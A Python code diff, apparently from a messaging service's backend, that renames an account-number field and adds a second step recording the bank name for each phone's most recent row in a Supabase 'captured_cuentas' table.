@@ -549,21 +549,47 @@ def get_notified_phones_amarillo_batch(phones: list) -> set:
         return set()
 
 
-def save_captured_cuenta(phone: str, cuenta: str, name: str):
-    """Saves a captured account number to the captured_cuentas table."""
+def save_captured_cuenta(phone: str, numero_cuenta: str, name: str):
+    """Saves a captured account number (step 1) to captured_cuentas. banco is NULL until step 2."""
     if not supabase_client:
         print("⚠️ Supabase client not initialized. Cannot save cuenta.")
         return False
     try:
         supabase_client.table('captured_cuentas').insert({
             "phone": phone,
-            "cuenta": cuenta,
+            "numero_cuenta": numero_cuenta,
             "name": name,
             "created_at": datetime.now().isoformat()
         }).execute()
         return True
     except Exception as e:
         print(f"❌ Error saving captured cuenta: {e}")
+        return False
+
+
+def update_captured_cuenta_banco(phone: str, banco: str):
+    """Updates the most recent captured_cuentas row for phone with the banco name (step 2)."""
+    if not supabase_client:
+        print("⚠️ Supabase client not initialized. Cannot update banco.")
+        return False
+    try:
+        # Find the latest row for this phone that has no banco yet
+        res = supabase_client.table('captured_cuentas')\
+            .select("id")\
+            .eq("phone", phone)\
+            .is_("banco", "null")\
+            .order("created_at", desc=True)\
+            .limit(1)\
+            .execute()
+        if res.data:
+            row_id = res.data[0]["id"]
+            supabase_client.table('captured_cuentas')\
+                .update({"banco": banco})\
+                .eq("id", row_id)\
+                .execute()
+        return True
+    except Exception as e:
+        print(f"❌ Error updating banco: {e}")
         return False
 
 
